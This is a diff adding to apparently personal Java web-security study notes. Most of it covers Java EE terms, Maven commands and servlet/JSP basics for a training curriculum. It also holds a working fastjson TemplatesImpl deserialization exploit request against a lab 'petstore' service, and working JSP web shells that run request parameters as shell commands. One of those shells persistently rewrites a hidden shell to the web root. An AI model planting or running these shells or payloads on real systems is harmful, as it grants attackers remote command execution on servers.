@@ -648,9 +648,53 @@ Content-Length: 709
 </soapenv:Envelope>
 ```
 
+payload for petstore-2 fastjson:
+
+run the calc in mac:
+
+```
+POST /contest_web_war/services/StoreManagerWebService?wsdl HTTP/1.1
+Host: 127.0.0.1:7001
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+SOAPAction: getCartItems
+Content-Type: text/xml
+Content-Length: 2562
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<getCartItems>
+<getCartItemsRequest>
+[{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUG9jOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcALwwAMAAxAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAyADMBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAZAAgAGgAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"},'a']
+</getCartItemsRequest>
+</getCartItems>
+</soapenv:Body>
+</soapenv:Envelope>
+```
+
+the previous payload payload would work under specific conditions:
+
+**Feature.SupportNonPublicField** is on
+
+
+fastjson attack vector with the jndi injection:
+
+
+
+
+
 source:
 server-config.wsdd
 storeManagerWebServiceXMLImpl.java
+
+
+
 
 ### understanding java rmi
 java remote method invocation, is akin to the RPC, with the support for transfer of serialized java classes and distributed garbage-collection
@@ -661,3 +705,572 @@ java remote method invocation, is akin to the RPC, with the support for transfer
 
 
 ### java json exploit (take the fast json as an example)
+
+fast json is developed by Ali, is claimed to be the fastest json library in java.
+
+serialize interface: toJsonString
+deserialize: parseObject
+
+
+2 types of exploit:*
+* based on TemplateImpl
+* based on JNDI(rmi/LDAP)
+
+In the high version of fast json , although I have set the autotype to true, but it still presents with the error:
+com.alibaba.fastjson.JSONException: autoType is not support.
+
+
+under the lower version of fastjson (such as 1.2.23), there are no functions such as setAutoTypeSupport. And if you would like to play with the vulnerability, you must claim the "Feature.SupportNonPublicField", for instance:
+```java
+String []itemIds= (String[])JSON.parseObject(cartjsonstr,String[].class,Feature.SupportNonPublicField);
+```
+
+
+
+
+### dangerous deserialization functions:
+ObjectInputStream.readObject
+ObjectInputStream.readUnshared
+XMLDecoder.readObject
+Yaml.load
+XStream.fromXML
+ObjectMapper.readValue
+JSON.parseObject
+
+
+
+### from java source file to java jar
+
+javac *.java
+jar cvfe rmi.jar rmi *.class
+java -jar rmi.jar 127.0.0.1
+
+
+
+
+
+### jenkins deserialization payload handcraft
+
+https://www.lucifaer.com/2019/03/04/Jenkins%20RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-1000861%E5%88%86%E6%9E%90%EF%BC%89/
+
+
+payload generation reference: will work on it at the end of Friday https://ssd-disclosure.com/archives/3171
+
+
+java reflection mechanism
+
+
+
+
+### understanding java reflection mechanism and java interface
+
+java reflection provide the ability to inspect and modify the runtime behaviors on the fly.
+
+some examples of java reflection in real framework:
+* junit: get test methods then invoke them
+* spring: dependencies injection
+* tomcat: dispatch the request to the correct module
+* eclipse: automatic completion of the methods in the period of programming
+
+not to supposed to apply the java reflection when the classes and interfaces are known
+
+reflection codes are hard to understand( might be a good feature for code obfuscatory)
+
+
+
+pop:
+
+map.ReferenceMap
+CopyOnWriteArraySet
+
+
+
+
+another pop:(not working)
+
+### the burp-suite extender to excavate the possible deserialization vulns
+
+
+
+### the curriculums designed for java web security
+
+day 1:  
+
+1. basic conception: java ee, jndi, ongl, rmi
+
+2. first java web app: IDE, language features, middleware, configuration, build tools, deployment, running and debugging
+
+3. basic vulnerable snippets example: file upload, file read, sql injection, command execution, xxe, unauthorized access, xml deserialization, fastjson  deserialization.
+
+
+
+day 2:
+
+1. java real vulnerable environments ( struts vulnerability examples, jekin, weblogic)
+
+2. java security challenges (petstore 1,2)
+
+day 3:
+
+1. java sandbox escape
+
+
+
+specific course:
+
+
+
+some terminology about Java 
+
+**java ee:**
+Java EE(enterprise), Java SE(standard), Java ME(micro)
+Java EE is the short form of Java Platform Enterprise Edition (used to be called as Java 2 Platform). Java web depends on the technologies that Java EE provided.
+
+
+
+the important technologies in Java EE
+**JavaBean:**
+a special class in Java, could capsulate several classes into one Bean. And the Bean could be used in serialization.
+
+**EJB:**
+Enterprise JavaBean
+
+**JDBC:**
+Java database connectivity
+
+**JMX:**
+Java management
+
+**JSP:**
+Java server page
+
+**JSTL:**
+Java server page standard tag library
+
+**Servlet:**
+
+1. a kind of Java software component used to extend the capability of the server.
+2. a java servlet process processes or stores a Java class that conforms Java Servlet API (a standard for implementing Java classes that respond to requests)
+3. servlet could be applied over any CS protocol, but in principal it's used with HTTP protocol.
+4. web container is responsible for managing the lifecycle of the servlet, mapping URLs to servlets
+5. servlet can be generated from JSP by JSP compiler, JSP is the html that embeds Java code, Servlet is the Java code that embeds html code.
+6. Usually, the lifecycle of the servlet is consisted of init(), service() and destroy()
+
+
+
+**filter:**
+using the filter to manage the request to all kinds of resources. The developer could intercept and modify the request/response before it goes to server/user
+
+Understanding the differences between web server, web container and web middleware:
+
+**web server:**
+the software or the host that provides web service
+
+example：apache iis nginx
+
+**web container:**
+the web container is the container where the real web applications exist. It manages the lifecycle of the web server and try to dispatch the URLs to corresponding servlets. web container is part of web middleware.
+
+example: tomcat(servlet container） IIS(asp container)
+
+**web middleware:**
+the software that connect the operating system and the web application.  In that case, the process of development will be decoupled from the divergency of the OS.
+web server > web container > web middleware
+
+
+
+The main procedures to create your first java web app:
+
+* install and start the intellij idea
+
+* create a new project with maven-webapp type 
+ps: group ID is the uniq id for the development organization, and the artifact ID is the uniq id for the project. 
+
+* and a class named com.haozi.test, and add the following code to it:
+
+```java
+package com.haozi;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.PrintWriter;
+
+
+public class test extends HttpServlet {
+    private String message;
+
+    @Override
+    public void init() throws ServletException {
+        message = "Hello world, this message is from servlet!";
+    }
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        //设置响应内容类型
+        resp.setContentType("text/html");
+
+        //设置逻辑实现
+        PrintWriter out = resp.getWriter();
+        out.println("<h1>" + message + "</h1>");
+    }
+
+    @Override
+    public void destroy() {
+        super.destroy();
+    }
+}
+```
+
+* update the web.xml to define the servlet and the mapping relationships from URLs to servlets:
+
+```xml
+  <servlet>
+    <servlet-name>test</servlet-name>
+    <servlet-class>com.haozi.test</servlet-class>
+  </servlet>
+
+  <servlet-mapping>
+    <servlet-name>test</servlet-name>
+    <url-pattern>/test</url-pattern>
+  </servlet-mapping>
+```
+
+ps: to add the url mapping, there is one substitutional way to do that, add the following java code:
+```
+@WebServlet("/test")
+```
+
+* add the dependency to the pom.xml
+
+```xml
+<dependency>
+      <groupId>javax.servlet</groupId>
+      <artifactId>javax.servlet-api</artifactId>
+      <version>4.0.1</version>
+      <scope>provided</scope>
+</dependency>
+```
+
+* edit the tomcat configuration
+run -> edit configuration 
+assign the folder of tomcat, then add the artifact to the deployment 
+
+ps: there are 2 options for deployment, war and war exploded, war exploded means that the IDE will upload the unpacked folder to tomcat server instead the packed war file, in that case, the tomcat server don't need to unpack the war file when it's deployed. (而且exploded之后，会使用一个临时的catalina home来运行程序，并且class文件只加载到内存里，运行完成后会删除所有临时文件）
+
+* run and visit the /test
+ps: the problem about the router. when the war file is deployed in the tomcat server, and the final route for /test is going to be like /test_war_exploded/test, this should be boiled down to the features of tomcat. when the war is deployed alone, this won't happen.
+
+* mvn command
+
+what is MVN?
+
+how to use MVN?
+
+the maven command  will look like "mvn [plugin-name]:[goal-name]"
+
+```
+-D 指定参数，如 -Dmaven.test.skip=true 跳过单元测试；
+-P 指定 Profile 配置，可以用于区分环境；
+-e 显示maven运行出错的信息；
+-o 离线执行命令,即不去远程仓库更新包；
+-X 显示maven允许的debug信息；
+```
+
+mvn archetype:generate -DgroupId=packageName -DartifactId=projectName -DarchetypeArtifactId=maven-archetype-webapp      (create maven project)
+
+mvn validate    (testify whether the maven project structure is valid)
+
+mvn test (run test）
+
+mvn install (install the project jar into the local maven repository)
+
+mvn dependency:sources (download the dependency)
+
+mvn tomcat:run （using the tomcat to start the project)
+mvn tomcat:deploy (**not finished yet, 403 problem with /deploy**)
+mvn tomcat:start
+mvn tomcat:stop
+mvn clean 
+mvn compile 
+mvn package
+
+the union command to pack our project
+> mvn clean compile package
+
+
+* export to jar file
+
+```shell
+mvn clean compile package
+java -jar xxx.jar
+```
+if you are confronted with the following error:
+> no manifest list in jar
+you may fix it by adding the following xml to pom.xml
+
+```
+      <plugin>
+        <groupId>org.apache.maven.plugins</groupId>
+        <artifactId>maven-compiler-plugin</artifactId>
+        <configuration>
+          <source>8</source>
+          <target>8</target>
+        </configuration>
+      </plugin>
+      <plugin>
+        <groupId>org.apache.maven.plugins</groupId>
+        <artifactId>maven-shade-plugin</artifactId>
+        <version>1.2.1</version>
+        <executions>
+          <execution>
+            <phase>package</phase>
+            <goals>
+              <goal>shade</goal>
+            </goals>
+            <configuration>
+              <transformers>
+                <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+                  <mainClass>com.haozi.calc</mainClass>
+                </transformer>
+              </transformers>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+ ```
+
+one more thing, in order to enable the jar could run without web server（container/middleware), you need to assign an internal webserver class for it.  We use spark here.
+
+we start a new project called test2, here is the main class code of it:
+
+```java
+package com.haozi;
+import spark.Spark;
+import spark.servlet.SparkApplication;
+import static spark.Spark.port;
+
+
+public class test2 implements SparkApplication {
+
+
+    public void init() {
+        Spark.staticFileLocation("/html");
+        Spark.get("/test", (req, res) -> {
+            return "Hello world, this message is from servlet!";
+        });
+    }
+
+    public static void main(String[] args) {
+        test2 i = new test2();
+        port(80);
+        i.init();
+    }
+}
+```
+
+* import static file
+put all the static file in resource folder, then add the following to config static file location:
+>  Spark.staticFileLocation("/html");
+
+using the file structure to import static file.
+
+* interact with the parameter
+```java
+//This is the test3 case
+PrintWriter out = resp.getWriter();
+String msg = req.getParameter("msg");
+out.println("<h1>" + msg + "</h1>");
+```
+the parameter obtain method will vary between different library, this is just an example.
+
+* import jsp file and basic jsp grammar
+
+jsp helloworld:
+```java
+<%
+out.println("hello world");
+%>
+```
+
+jsp Chinese character:
+```java
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>hello</title>
+</head>
+<body>
+<%
+out.println("你 好!");
+%>
+</body>
+</html>
+```
+
+jsp declaration:
+
+```
+<%! int i = 0; %> 
+<%! int a, b, c; %> 
+<%! Circle a = new Circle(2.0); %> 
+```
+
+jsp expression: 
+```
+<%= (new java.util.Date()).toLocaleString()%>
+```
+
+jsp action: (some pre-defined function to improve efficiency)
+```
+<jsp:action_name attribute="value" />
+```
+
+
+jsp instruction: (this is used to set properties that take effect in the whole page）
+```
+<%@ page ... %>
+<%@ include ... %> (include other jsp file)
+<%@ taglib ... %> （import tag library)
+```
+
+jsp global object: (**very important**)
+request 
+response
+out
+session
+application (the instance of servlet context)
+config
+pageContext
+page    ("this" pointer)
+Exception
+
+
+
+jsp processing procedures in web container：
+> hello.jsp => helloServlet.java => helloServlet.class
+jsp is a kind of servlet
+
+
+
+lifecycle of jsp:
+compiling,  initialize, execute, destroy
+
+
+jsp simple backdoor:
+linux version
+```java
+<%
+java.io.InputStream input = Runtime.getRuntime().exec(new String[] {"sh","-c",request.getParameter("q")}).getInputStream();
+int len = -1;byte[] bytes = new byte[4092];
+while ((len = input.read(bytes)) != -1) 
+{out.println(new String(bytes, "GBK"));}
+%>
+```
+
+windows version:
+
+```java
+
+<% 
+java.io.InputStream input = Runtime.getRuntime().exec(new String[] {"cmd.exe","/c",request.getParameter("cmd")}).getInputStream();
+int len = -1;
+byte[] bytes = new byte[4092];
+while ((len = input.read(bytes)) != -1) 
+{out.println(new String(bytes, "GBK"));}
+%>
+
+```
+
+undead jsp:
+
+```java
+<% 
+int i=2;
+while(i>1){
+new java.io.FileOutputStream("//var/www/html//--7a35bb22cf1a5f194cf7b3ae3b5de5ca.jsp").write("<% java.io.InputStream input = Runtime.getRuntime().exec(new String[] {\"sh\",\"-c\",request.getParameter(\"0b6b61fc8abb7bae21713b3ffd5b1c2d\")}).getInputStream();int len = -1;byte[] bytes = new byte[4092];while ((len = input.read(bytes)) != -1) {out.println(new String(bytes, \"GBK\"));}%\>".getBytes());
+Thread.sleep(100);
+}
+%>
+```
+
+
+* the file structure of war and jar
+.jar files: The .jar files contain libraries, resources and accessories files like property files.
+.war files: The war file contains the web application that can be deployed on any servlet/jsp container. The .war file contains jsp, html, javascript and other files necessary for the development of web applications.
+
+file structure of jar:
+
+```
+ creating: META-INF/
+  inflating: META-INF/MANIFEST.MF    
+   creating: com/
+   creating: com/haozi/
+  inflating: com/haozi/gallery.class  
+   creating: META-INF/maven/
+   creating: META-INF/maven/haozi/
+   creating: META-INF/maven/haozi/ez_gallery/
+  inflating: META-INF/maven/haozi/ez_gallery/pom.xml  
+  inflating: META-INF/maven/haozi/ez_gallery/pom.properties
+```
+  
+  file structure of war:
+  
+```
+  META-INF (meta info)
+  WEB-INF （your class and web files and library jar)
+  org（library) 
+```
+
+
+* java class file decompile
+
+```
+jad -o -r -sjava -dsrc ./\*\*/\*.class
+```
+
+
+* CATALINA_BASE and CATALINA_HOME
+
+  CATALINA_HOME (the installment dir of tomcat)
+  CATALINA_BASE (the working dir of tomcat)
+
+
+* jsp backdoor
+
+
+* java code audit
+
+* filter 
+
+The most used web container in java web application
+
+**tomcat:**
+
+**websphere:**
+
+**weblogic:**
+
+**jenkins:**
+
+**jboss:**
+
+
+
+C:\Python27;C:\Program Files (x86)\Nmap;%IntelliJ IDEA%;C:\Program Files\JetBrains\IntelliJ IDEA 2019.2.2\jbr\bin
+
+
+
+
+
+
+
+
+
+
+
+ 
